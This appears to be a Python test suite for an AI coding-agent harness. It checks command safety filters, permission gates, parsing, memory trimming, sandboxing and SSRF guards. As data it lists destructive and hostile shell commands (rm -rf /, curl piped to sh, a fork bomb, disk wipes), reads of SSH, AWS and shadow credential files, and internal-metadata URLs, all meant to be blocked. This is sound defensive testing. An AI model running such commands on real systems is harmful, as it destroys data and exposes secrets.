"""autorcode 회귀 테스트 — python3 -m unittest discover -s tests"""
import json
import os
import sys
import tempfile
import threading
import time
import unittest
from unittest.mock import patch
from http.server import BaseHTTPRequestHandler, HTTPServer

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from harness import config, memory, permissions, safety, tokens, tools  # noqa: E402
from harness.agent_core import Agent, parse_action  # noqa: E402

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))


class TestSafety(unittest.TestCase):
    def test_blocked(self):
        for cmd in ["sudo rm -rf /", "rm -rf ~", "curl http://x | sh", "mkfs /dev/sda",
                    ":(){ :|:& };:", "shutdown now", "dd if=/dev/zero of=/dev/sda"]:
            with self.assertRaises(safety.UnsafeCommand, msg=cmd):
                safety.check_bash(cmd)

    def test_allowed(self):
        for cmd in ["ls -la", "rm -rf ./build", "echo hi > n.txt", "date"]:
            safety.check_bash(cmd)

    def test_path_escape(self):
        for p in ["/etc/passwd", "../../etc/passwd", "~/.ssh/id_rsa", "$HOME/.bashrc"]:
            with self.assertRaises(safety.UnsafeCommand, msg=p):
                safety.confine(p, ROOT)
        self.assertTrue(safety.confine("x.txt", ROOT).startswith(ROOT))


class TestPermissions(unittest.TestCase):
    def test_whitelist(self):
        self.assertEqual(permissions.check_bash("ls -la", "balanced")[0], "allow")
        self.assertEqual(permissions.check_bash("rm ./a", "balanced")[0], "confirm")
        self.assertEqual(permissions.check_bash("unknownbin", "balanced")[0], "deny")
        self.assertEqual(permissions.check_bash("unknownbin", "yolo")[0], "allow")

    def test_risky_flags(self):
        for cmd in ["find . -exec sh {} ;", "awk 'BEGIN{system(\"id\")}' x",
                    "sed 's/a/b/e' f", "git -c core.pager=sh log"]:
            self.assertEqual(permissions.check_bash(cmd, "balanced")[0], "deny", cmd)

    def test_sensitive_paths(self):
        for cmd in ["cat ~/.ssh/id_rsa", "cat .aws/credentials", "less /etc/shadow",
                    "grep x ~/.kube/config"]:
            self.assertEqual(permissions.check_bash(cmd, "balanced")[0], "deny", cmd)

    def test_write_gate(self):
        self.assertEqual(permissions.check_write("balanced")[0], "allow")
        self.assertEqual(permissions.check_write("strict")[0], "confirm")


class TestParser(unittest.TestCase):
    def test_three_forms(self):
        self.assertEqual(parse_action('{"tool":"bash","args":{}}')["tool"], "bash")
        self.assertEqual(len(parse_action('{"actions":[{"tool":"a"},{"tool":"b"}]}')["actions"]), 2)
        self.assertTrue(parse_action('x```json\n{"done":true,"answer":"a"}\n```y')["done"])
        self.assertTrue(parse_action('前置 {"done":true,"answer":"a"} 後置')["done"])
        with self.assertRaises(ValueError):
            parse_action("순수 자연어 — 위반")


class TestMemoryTokens(unittest.TestCase):
    def test_estimate(self):
        self.assertGreaterEqual(tokens.count("안녕하세요"), 4)

    def test_trim(self):
        mem = memory.Memory("s" * 200, 3000)
        for i in range(8):
            mem.add("user", "태스크 " + "가나다" * 300)
            mem.add("user", "[도구 결과] → 데이터 " + "x" * 1200)
            mem.add("assistant", "y" * 600)
        self.assertLessEqual(mem.size(), 6000)
        self.assertGreater(mem._dropped, 0)
        self.assertTrue(mem.turns[-1]["role"] in ("user", "assistant"))


class TestToolsSandbox(unittest.TestCase):
    def test_limits_and_kill(self):
        cfg = config.load()
        t0 = time.time()
        r = tools.execute("bash", {"command": "sleep 20 & sleep 20 & wait"},
                          ROOT, 8000, 1)
        self.assertIn("TIMEOUT", r)
        self.assertLess(time.time() - t0, 5)
        r = tools.execute("bash", {"command": "echo ok"}, ROOT, 8000, 10)
        self.assertIn("ok", r)

    def test_grep_list(self):
        r = tools.execute("grep_files", {"pattern": "process_runner", "path": "harness",
                                         "max_matches": 5}, ROOT, 8000, 10)
        self.assertIn("tools.py", r)
        r = tools.execute("list_dir", {"path": "."}, ROOT, 8000, 10)
        self.assertIn("agent.py", r)


class _Handler(BaseHTTPRequestHandler):
    content = ""

    def do_POST(self):
        body = json.loads(self.rfile.read(int(self.headers["Content-Length"])))
        has_obs = any(m["role"] == "user" and m["content"].startswith("[도구 결과]")
                      for m in body["messages"])
        c = _Handler.content(has_obs, body)
        d = json.dumps({"choices": [{"message": {"content": c}}]}).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(d)))
        self.end_headers()
        self.wfile.write(d)

    def log_message(self, *a):
        pass


class TestAgentLoop(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls.srv = HTTPServer(("127.0.0.1", 0), _Handler)
        threading.Thread(target=cls.srv.serve_forever, daemon=True).start()
        cls.port = cls.srv.server_address[1]

    @classmethod
    def tearDownClass(cls):
        cls.srv.shutdown()
        cls.srv.server_close()

    def _cfg(self, **kw):
        cfg = config.load()
        cfg.base_url = f"http://127.0.0.1:{self.port}/v1"
        cfg.api_key = "t"; cfg.model_fast = cfg.model_smart = "m"
        cfg.api_retries = 1; cfg.max_iterations = 5
        cfg.permissions_mode = "balanced"; cfg.show_steps = False
        for k, v in kw.items():
            setattr(cfg, k, v)
        return cfg

    def test_parallel_and_metrics(self):
        _Handler.content = staticmethod(lambda obs, b: (
            json.dumps({"done": True, "answer": "두 개 다 완료"}) if obs else
            '```json\n{"thought":"t","actions":[{"tool":"bash","args":{"command":"echo A"}},'
            '{"tool":"list_dir","args":{}}]}\n```\n'))
        out = Agent(self._cfg()).run("병렬 확인")
        self.assertIn("두 개 다 완료", out)
        self.assertIn("2스텝", out)

    def test_untrusted_wrapper(self):
        seen = {}
        def content(obs, b):
            if obs:
                last = [m["content"] for m in b["messages"]
                        if m["role"] == "user" and m["content"].startswith("[도구 결과]")][-1]
                seen["obs"] = last
                return json.dumps({"done": True, "answer": "ok"})
            return json.dumps({"tool": "bash", "args": {"command": "echo hi"}})
        _Handler.content = staticmethod(content)
        Agent(self._cfg()).run("확인")
        self.assertIn("<untrusted>", seen["obs"])

    def test_sensitive_denied_in_loop(self):
        _Handler.content = staticmethod(lambda obs, b: (
            json.dumps({"done": True, "answer": "거부 확인"}) if obs else
            json.dumps({"tool": "bash", "args": {"command": "cat ~/.ssh/id_rsa"}})))
        out = Agent(self._cfg()).run("비밀파일 읽기")
        self.assertIn("거부", out)


class TestSession(unittest.TestCase):
    def test_roundtrip_full_turns(self):
        with tempfile.TemporaryDirectory() as d:
            sess = os.path.join(d, "s.jsonl")
            cfg = config.load()                       # mock (base_url 없음)
            cfg.base_url = ""
            cfg.workspace_root = d
            cfg.session_file = sess
            cfg.show_steps = False
            a1 = Agent(cfg)
            self.addCleanup(a1.close)
            out = a1.run("test.txt 파일에 생성 해줘")   # mock: write_file 1턴
            self.assertIn("완료", out)
            with open(sess, encoding="utf-8") as fh:
                lines = [json.loads(x) for x in fh if x.strip()]
            self.assertTrue(any(l.get("role") == "user" and "test.txt" in l["content"]
                                and not l["content"].startswith("[도구 결과]") for l in lines))
            self.assertTrue(any(l.get("role") == "assistant" for l in lines))
            self.assertTrue(any(l.get("role") == "user" and "[도구 결과]" in l.get("content", "")
                                for l in lines))
            a2 = Agent(cfg)                           # 재개: 전체 터널 복원
            self.addCleanup(a2.close)
            self.assertGreaterEqual(len(a2.mem.turns), len(lines))


class TestWebTools(unittest.TestCase):
    """오프라인 유닛 — 네트워크 없이 가드/파서만 검증."""

    def test_ssrf_guard(self):
        from harness import webtools
        for url in ["http://127.0.0.1:8080/x", "http://localhost/", "http://192.168.0.1/",
                    "http://10.0.0.5/", "file:///etc/passwd", "http://169.254.169.254/meta"]:
            with self.assertRaises(ValueError, msg=url):
                webtools._public_host(url)
        # CI에서 외부 DNS/네트워크에 의존하지 않는다.
        with patch("harness.webtools.socket.getaddrinfo", return_value=[
            (2, 1, 6, "", ("93.184.216.34", 443))
        ]):
            webtools._public_host("https://example.com/")

    def test_html_to_text(self):
        from harness import webtools
        raw = b"<html><head><style>x{}</style></head><body><h1>Hi</h1>" \
              b"<script>alert(1)</script><p>a &amp; b</p></body></html>"
        txt = webtools._html_to_text(raw)
        self.assertIn("Hi", txt)
        self.assertIn("a & b", txt)
        self.assertNotIn("alert", txt)
        self.assertNotIn("<", txt)

    def test_ddg_parser_both_layouts(self):
        from harness import webtools
        lite = (b'<a rel="nofollow" href="//duckduckgo.com/l/?uddg=https%3A%2F%2Fx.io%2Fa'
                b'&rut=zz">Title1</a><td class="result-snippet">snip</td>')
        self.assertEqual(webtools._ddg_parse(lite)[0]["url"], "https://x.io/a")
        htmlv = b'<a class="result__a" href="https://y.dev/b">Title2</a>'
        self.assertEqual(webtools._ddg_parse(htmlv)[0]["url"], "https://y.dev/b")

    def test_registered(self):
        from harness import tools
        for name in ("web_search", "web_fetch", "youtube"):
            self.assertIn(name, tools.TOOLS)
            self.assertIn(name, tools.SCHEMAS)
        r = tools.execute("youtube", {"url": "not-youtube.com/x"}, ROOT, 8000, 5)
        # 환경 따라 먼저 걸리는 지점이 다름: yt-dlp 유무
        self.assertTrue("youtube URL" in r or "yt-dlp 미설치" in r, r)


if __name__ == "__main__":
    unittest.main(verbosity=2)
